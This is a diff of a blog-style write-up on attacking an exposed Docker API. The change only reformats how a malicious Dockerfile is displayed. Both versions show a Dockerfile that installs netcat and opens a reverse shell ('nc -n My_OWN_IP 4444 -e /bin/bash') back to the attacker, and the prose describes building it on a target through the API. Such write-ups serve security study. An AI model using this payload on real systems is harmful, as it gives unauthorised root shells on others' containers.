@@ -37,9 +37,9 @@ After some quick reading through the [Docker API Documentation](https://docs.doc
 Since Docker allows us to create an image from a _Dockerfile_, it shouldn't be too different if performed through the API, right?
 We begin to craft our own malicious _Dockerfile_ and upload it anywhere on the internet. The Dockerfile I created utilized a clean Ubuntu installation and the good ol' netcat to give us a reverse TCP shell with root access to the container.
 
-```FROM ubuntu:16.04
-RUN apt-get update -y && apt-get install netcat -y
-CMD ["nc", "-n", "My_OWN_IP", "4444", "-e", "/bin/bash"]```
+`FROM ubuntu:16.04`
+`RUN apt-get update -y && apt-get install netcat -y`
+`CMD ["nc", "-n", "My_OWN_IP", "4444", "-e", "/bin/bash"]`
 
 Afterwards, we start to craft the POST request and the JSON object needed in order to build our image.
 
